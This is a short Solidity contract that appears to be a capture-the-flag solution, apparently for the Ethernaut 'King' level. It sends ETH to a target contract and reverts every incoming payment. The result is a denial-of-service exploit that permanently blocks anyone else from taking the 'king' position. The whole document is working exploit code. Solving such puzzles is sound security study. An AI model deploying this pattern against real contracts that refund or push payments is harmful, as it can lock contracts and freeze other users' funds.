pragma solidity ^0.8.13;

contract KingSolver {

    function solve(address payable target) public payable {
        target.call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }}